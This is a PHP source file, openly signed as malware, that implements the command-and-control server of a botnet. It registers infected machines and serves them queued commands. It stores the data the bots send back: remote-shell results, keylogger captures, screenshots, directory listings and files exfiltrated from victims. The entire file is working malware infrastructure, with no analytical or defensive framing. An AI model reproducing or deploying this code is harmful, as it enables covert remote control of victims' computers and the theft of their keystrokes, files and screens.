<?php
        /*
        ##################################################
        #                                                #
        #         Malware Coder: Elliot Alderson         #
        #                                                #
        #   Github: https://github.com/ElliotAlderson51  #
        #                                                #
        ##################################################
        */
include 'db.php';

$db = new db;

// Function to get the client IP address
function get_client_ip()
{
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR')){
        $ipaddress = getenv('REMOTE_ADDR');
        echo "\t6\t";
    }
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

function make_spaces($string)
{
    for($i = 0; $i < strlen($string); $i++)
    {
        if($string[$i] == '+')
            $string[$i] = ' ';
    }
    return $string;
}

$ip = get_client_ip();

if(isset($_GET['bot']))
{
    $bot_id = mysqli_real_escape_string($db->conn, make_spaces($_GET['bot']));   
    $sql = "SELECT * FROM bots WHERE bot_id='$bot_id' AND NOT isBanned='1' AND NOT isDead='1'";
    $result = mysqli_query($db->conn, $sql);

    if(mysqli_num_rows($result) > 0)
    {
        $date = date('Y-m-d H:i:s');
        $sql = "UPDATE bots SET status='1', last_seen='$date' WHERE bot_id='$bot_id'";
        mysqli_query($db->conn, $sql);

        $remote_shell_file = "bots_info\\remote_shell_".$bot_id.".txt";
        $bot_logs_file = "bots_info\\log_".$bot_id.".txt";
        $bot_keylogger_file = "bots_info\\keylogger_".$bot_id.".txt";
        $bot_file_explorer = "bots_info\\file_explorer_".$bot_id.".txt";

        // Initialize IP & PC_Name & GPU into the database
        if(isset($_GET['ip']) && isset($_GET['pc_name']) && isset($_GET['gpu']))
        {
            $ip = mysqli_real_escape_string($db->conn, make_spaces($_GET['ip']));   
            $pc_name = mysqli_real_escape_string($db->conn, make_spaces($_GET['pc_name']));   
            $gpu = mysqli_real_escape_string($db->conn, make_spaces($_GET['gpu']));
            
            if(strlen($ip) < 100 && strlen($pc_name) < 100 && strlen($gpu) < 200)
            {
                $sql = "UPDATE bots SET ip_address='$ip', pc_name='$pc_name', gpu='$gpu' WHERE bot_id='$bot_id'";
                mysqli_query($db->conn, $sql);
            }
        }

        // Create a row to the bot in the commands table
        $sql = "SELECT * FROM commands WHERE bot_id='$bot_id'";
        $result2 = mysqli_query($db->conn, $sql);
        if(mysqli_num_rows($result2) == 0)
        {
            $sql = "INSERT INTO commands (command, bot_id) VALUES ('', '$bot_id')";
            mysqli_query($db->conn, $sql);
        }
        else // print the command so the bot can take it
        {
            $row = mysqli_fetch_assoc($result2);
            if($row['command'] != "")
                echo $row['command'];
        }

        // Remote shell result
        if(isset($_GET['remote_shell']))
        {
            $rs_result = mysqli_real_escape_string($db->conn, make_spaces($_GET['remote_shell']));   
            if($rs_result != "" && strlen($rs_result) < 5000)
            {
                if(file_exists($remote_shell_file))
                {
                    $sql = "SELECT * FROM commands WHERE bot_id='$bot_id'";
                    $result = mysqli_query($db->conn, $sql);
                    if(mysqli_num_rows($result) > 0)
                    {
                        // This check will prevent spamming from the bot
                        $row = mysqli_fetch_assoc($result);
                        if($row['command']  != '')
                        {
                            $data = "result ".$rs_result.PHP_EOL;
                            $file = fopen($remote_shell_file, 'a');
                            fwrite($file, $data);

                            // Prevent from spamming: the bot cant send more results because the command in the database is empty
                            $sql = "UPDATE commands SET command='' WHERE bot_id='$bot_id'";
                            mysqli_query($db->conn, $sql);
                        }
                    }
                }
            }
        }

        // Task Scheduler
        if(isset($_GET['task_scheduler']))
        {
            $ts = mysqli_real_escape_string($db->conn, make_spaces($_GET['task_scheduler']));
            if($ts != "" && strlen($ts) < 50)
            {
                if(file_exists($bot_logs_file))
                {
                    $sql = "SELECT * FROM commands WHERE bot_id='$bot_id'";
                    $result = mysqli_query($db->conn, $sql);
                    if(mysqli_num_rows($result) > 0)
                    {
                        // This check will prevent spamming from the bot
                        $row = mysqli_fetch_assoc($result);
                        if($row['command']  != '')
                        {
                            $data = $ts.PHP_EOL;
                            $file = fopen($bot_logs_file, 'a');
                            fwrite($file, $data);

                            // Prevent from spamming: the bot cant send more results because the command in the database is empty
                            $sql = "UPDATE commands SET command='' WHERE bot_id='$bot_id'";
                            mysqli_query($db->conn, $sql);
                        }
                    }
                }
            }   
        }

        // Screenshot
        if(isset($_GET['screenshot']))
        {
            $url = mysqli_real_escape_string($db->conn, make_spaces($_GET['screenshot']));

            if($url != "" && $url < 500)
            {
                // Go to the button id
                $html = file_get_contents($url);
                $start = stripos($html, 'id="download-url"');
                $end = stripos($html, '</a>', $offset = $start);
                $length = $end - $start;
                $htmlSection = substr($html, $start, $length);

                // Get the url from the button
                $start = stripos($htmlSection, 'https:');
                $end = stripos($htmlSection, '"', $offset = $start);
                $length = $end - $start;
                $htmlSection = substr($htmlSection, $start, $length);

                $ext = pathinfo($htmlSection, PATHINFO_EXTENSION); // Get file extension
                $file_path = "bots_info\\screenshot_".$bot_id.".".$ext;

                $file = fopen($file_path, 'w');
                file_put_contents($file_path, fopen($htmlSection, 'r'));
                fclose($file);

                // Prevent from spamming: the bot cant send more results because the command in the database is empty
                $sql = "UPDATE commands SET command='' WHERE bot_id='$bot_id'";
                mysqli_query($db->conn, $sql);
            }
        }


        // Keylogger
        if(isset($_GET['keylogger']))
        {
            $key_logs = mysqli_real_escape_string($db->conn, make_spaces($_GET['keylogger']));

            str_replace(" OERDOF9 ", " RETURN ", $key_logs);
            str_replace(" ELROFJ8 ", " SHIFT ", $key_logs);
            str_replace(" GHQI3DB ", " BACKSPACE ", $key_logs);
            str_replace(" WIFLCF ", " CAPSLOCK ", $key_logs);
            str_replace(" FEOLAE ", " DELETE ", $key_logs);

            if($key_logs != "" && $key_logs < 100)
            {
                $sql = "SELECT * FROM commands WHERE bot_id='$bot_id'";
                $result = mysqli_query($db->conn, $sql);

                if(mysqli_num_rows($result) != 0)
                {
                    $row = mysqli_fetch_assoc($result);
                    $isKeylogger = $row['keylogger'];

                    if($isKeylogger == 1)
                    {
                        if(file_exists($bot_keylogger_file))
                        {
                            $data = $key_logs." ";
                            $file = fopen($bot_keylogger_file, 'a');
                            fwrite($file, $data);
                        }
                    }
                }
            }
        }

        // File Explorer
        if(isset($_GET['file_explorer']))
        {
            $dir = mysqli_real_escape_string($db->conn, make_spaces($_GET['file_explorer']));
            if($dir != "")
            {
                $dir = str_replace('*', PHP_EOL, $dir);

                if(file_exists($bot_file_explorer) == false)
                {
                    file_put_contents($bot_file_explorer, "");
                }

                if(file_exists($bot_file_explorer))
                {
                    $file = fopen($bot_file_explorer, 'w');
                    file_put_contents($bot_file_explorer, $dir);
                    fclose($file);

                    // Prevent from spamming: the bot cant send more results because the command in the database is empty
                    $sql = "UPDATE commands SET command='' WHERE bot_id='$bot_id'";
                    mysqli_query($db->conn, $sql);
                }
            }
        }

        // File Explorer Download File
        if(isset($_GET['download_file']))
        {
            $url = mysqli_real_escape_string($db->conn, make_spaces($_GET['download_file']));

            if($url != "" && $url < 500)
            {
                // Go to the button id
                $html = file_get_contents($url);
                $start = stripos($html, 'id="download-url"');
                $end = stripos($html, '</a>', $offset = $start);
                $length = $end - $start;
                $htmlSection = substr($html, $start, $length);

                // Get the url from the button
                $start = stripos($htmlSection, 'https:');
                $end = stripos($htmlSection, '"', $offset = $start);
                $length = $end - $start;
                $htmlSection = substr($htmlSection, $start, $length);

                $random_name = Rand(100000, 999999);
                $ext = pathinfo($htmlSection, PATHINFO_EXTENSION); // Get file extension
                $file_path = "bots_info\\".$random_name."_".$bot_id.".".$ext;

                $file = fopen($file_path, 'w');
                file_put_contents($file_path, fopen($htmlSection, 'r'));
                fclose($file);

                $data = $file_path.PHP_EOL;
                $file = fopen($bot_logs_file, 'a');
                fwrite($file, $data);

                // Prevent from spamming: the bot cant send more results because the command in the database is empty
                $sql = "UPDATE commands SET command='' WHERE bot_id='$bot_id'";
                mysqli_query($db->conn, $sql);
            }
        }

        // File Explorer Upload File
        if(isset($_GET['upload_file']))
        {
            $s = mysqli_real_escape_string($db->conn, make_spaces($_GET['upload_file']));

            if($s != "")
            {
                $data = $s.PHP_EOL;
                $file = fopen($bot_logs_file, 'a');
                fwrite($file, $data);
            }

            // Prevent from spamming: the bot cant send more results because the command in the database is empty
            $sql = "UPDATE commands SET command='' WHERE bot_id='$bot_id'";
            mysqli_query($db->conn, $sql);

        }
    }
    else
    {
        $sql = "SELECT * FROM bots WHERE creator_address='$ip'";
        $result = mysqli_query($db->conn, $sql);
        if(mysqli_num_rows($result) == 0)
        {
            $sql = "INSERT INTO bots (bot_id, creator_address) VALUES ('$bot_id', '$ip')";
            mysqli_query($db->conn, $sql);

            $sql = "SELECT * FROM commands WHERE bot_id='$bot_id'";
            $result2 = mysqli_query($db->conn, $sql);
            if(mysqli_num_rows($result2) == 0)
            {
                $sql = "INSERT INTO commands (command, bot_id) VALUES ('', '$bot_id')";
                mysqli_query($db->conn, $sql);
            }
        }
    }
}

?>

